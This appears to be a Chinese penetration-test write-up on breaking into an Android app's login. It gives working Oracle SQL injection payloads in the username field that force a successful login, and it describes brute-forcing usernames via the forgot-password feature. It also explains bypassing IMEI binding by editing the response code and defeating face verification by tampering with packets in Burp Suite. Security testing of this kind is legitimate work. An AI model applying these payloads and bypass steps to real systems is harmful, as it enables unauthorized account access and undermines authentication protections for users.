### 测试结果：App返回成功

在使用Oracle数据库进行`UNION`查询时，要求所有字段的数据类型必须一致。因此，我们进行了字段数据类型的测试，最终结果如下：

#### 测试1：万能密码验证
- **明文**：
  ```json
  {
    "userName": "TEST'union/**/select/**/1,'123','123','123','123','123','123','123',1 from dual-- ",
    "passWord": "123",
    "osType": "android",
    "osVersion": "5.1.1",
    "appVersion": "20.06.04",
    "loginType": "1",
    "model": "V1938T",
    "brand": "vivo",
    "imei": "865166023309431",
    "version": "new"
  }
  ```
- **密文**：
  ```
  QSXBDUSV0QpJkd5tWYB1UdsBTTXFTbZBXOtFmSWh1TYZUbltEasdVevBTUNx2VSZTMF1kcSVFV2Ezah5EZYdVc1UUZWBXbUBzaVFGUsJTYYBnRkNXMXNlesVVZppERiRnUXFmdwd1UyZleWpFbuNFdsBzYK50aWBDMFZFUoh1Vzx2aOpkTrl1cKxWTpJlbTREeVFmRwd1UysGMVFGZIJWSaZFZzpkaXJDaYJmSOh1UEVDMkBzatR1MSpXUOxGWTBXOVFGMJpWW3VzaipGetd1ROJDZHFzVTpHbwUlTWhlUxhXVNpEbyQFcSpWTpJkbUVnTHJWYGpXWyAHMR1EbXVFWG1GZLh2aXFjWVJmSaR1UUBXMkNHarZlNsRlYK5EWTVTMVVmRwd1UysGMRFGbY9UeZxWZPhmVXNDcwEVTsdVUUhXRkNDZWdFeJFjUKJFWPRnTXJ2QOZFV650Vl5EbYJlNwBzYqxGWUVjVrV2SONTW1ETVlZEcuNleOdVZOxGWSZDcwMmashFV1Y1altkTzkVNxUVZGBnbTpnTXVmTshlU2AHMjZEcIRFe5cVZNJkaUhFcxM2VKpXWykzVhxkWI5UeJd0YxMmRaVnRW1kVatWVzx2aOpkTsdFMaVlYVxmbWlXTX10SshlW
  ```
- **结果**：提示是弱密码（说明此方法可行）

#### 测试2：确定密码字段
- **明文**：
  ```json
  {
    "userName": "TEST'union/**/select/**/1,'123','123','Ceshi123@@@','123','123','123','123',1 from dual-- ",
    "passWord": "Ceshi123@@@",
    "osType": "android",
    "osVersion": "5.1.1",
    "appVersion": "20.06.04",
    "loginType": "1",
    "model": "V1938T",
    "brand": "vivo",
    "imei": "865166023309431",
    "version": "new"
  }
  ```
- **密文**：
  ```
  k0VwAlUFNUaCZXerFWUPtEbIp1cWRlYKpFVTBnStR2cKpXW1olVitGbyQGcsVUZOJ1aUFTRrVmTwh1UFFzaNplUWRFerZkUQxmMiFHbFN2VkxWW3BHMR1EbH9EdSd0YhVzVTJzawEVYW5mU050VhtkTFRFcGxmUQB3MhVVMwY1SsJDVwR2MWFGdX9EWKdVYzw2VTRDbVFGUsdlVI50VONFetl1dS1WTp5kbTREeVFmUSVFVxwmRS5kVYFVcxUVY2B3VTFDb6ZFaw52UZBXMWNEawk1bwBTUNx2VSFHeFVGMNxGVwlTbhpkVY9EWG1WZLhGbXhVNw0UasJDZwxGMhNnSqlVNKZlYphWbTBXOVFmVkBTWxkkVNpmWuNFR4VVYCZVVVJUNrFmToNTYIZUbldlSUVFc50WYKRXbTpXSHd1TOpXWvp0aipkTYNFRsVEZ310aZ9mWGNVYkdUT5l0VlFGZVNFNkhVZLBHWTVVMrJ2Ms52U2wWRW5UNyQWNwtWZKJlVUVHZYV2Swh1UVFzaiNDbuNlQKVlUSBHWTVVMFN2bKpXWzVTRNtkTzkVNxUVZGBnbTpnTXVmTshlU2AHMjZEcIRFe5cVZNJkaUhFcxM2VKpXWykzVhxkWI5UeJd0YxMmRaVnRW1kVatWVzx2aOpkTsdFMaVlYVxmbWlXTX10SshlW
  ```
- **结果**：提示登录成功

#### 绕过后的异常处理
绕过后，程序出现了异常。通过观察返回的数据，发现其中包含了一些构造的用户信息，如用户名、职工号、邮箱、姓名、手机号等。为了进一步测试，我们需要一个真实的用户信息。

#### 获取真实用户信息
App提供了忘记密码功能，可以利用该功能爆破用户名。通过字典跑出多个用户名后，使用短信验证码登录并解密数据包，获取了用户基本信息。

#### 最终测试
- **明文**：
  ```json
  {
    "userName": "TEST\'union/**/select/**/,\'Qwe123@@@\',\'\',\'Qwe123@@@\',\'\',\'\',\'\',\'865166023309431\', from dual -- ",
    "passWord": "Qwe123@@@",
    "osType": "android",
    "osVersion": "5.1.1",
    "appVersion": "20.06.04",
    "loginType": "1",
    "model": "V1938T",
    "brand": "vivo",
    "imei": "865166023309431",
    "version": "new"
  }
  ```
- **密文**：
  ```
  xxxxxxxxx
  ```
- **结果**：提示登录成功

#### 绑定IMEI和人脸认证
- **绑定IMEI**：提示绑定IMEI，通过修改返回包中的`resultCode`从1001改为1000来绕过。
- **人脸认证**：先用自己的脸检测，然后通过Burp Suite丢弃手机发向服务器的包，再将大数据包中的人脸数据替换为空并发送。

最终成功登录App。